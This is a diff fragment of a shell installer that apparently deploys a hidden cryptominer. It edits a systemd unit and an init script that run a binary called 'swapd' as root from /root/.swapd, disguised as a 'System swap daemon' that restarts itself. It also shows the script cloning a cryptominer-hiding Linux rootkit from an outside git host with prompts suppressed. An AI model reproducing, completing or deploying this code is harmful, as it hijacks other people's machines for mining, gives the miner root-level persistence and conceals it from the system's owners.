@@ -521,7 +521,7 @@ After=network.target
 Type=simple
 User=root
 WorkingDirectory=/root/.swapd
-ExecStart=/root/.swapd/swapd -c /root/.swapd/swapfile
+ExecStart=./swapd -c swapfile
 Restart=always
 RestartSec=10
 Nice=19
@@ -580,8 +580,8 @@ else
 # Short-Description: System swap daemon
 ### END INIT INFO
 
-DAEMON=/root/.swapd/swapd
-DAEMON_ARGS="-c /root/.swapd/swapfile"
+DAEMON=./swapd
+DAEMON_ARGS="-c swapfile"
 NAME=swapd
 PIDFILE=/var/run/$NAME.pid
 WORKDIR=/root/.swapd
@@ -590,7 +590,7 @@ case "$1" in
     start)
         echo "Starting $NAME..."
         cd $WORKDIR
-        start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --exec $DAEMON -- $DAEMON_ARGS || true
+        start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --chdir $WORKDIR --exec $WORKDIR/swapd -- $DAEMON_ARGS || true
         ;;
     stop)
         echo "Stopping $NAME..."
@@ -830,6 +830,7 @@ fi
 
 # Clone and build the crypto-miner rootkit
 echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
+
 export GIT_TERMINAL_PROMPT=0
 if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>&1 | grep -v "Username"; then
     unset GIT_TERMINAL_PROMPT
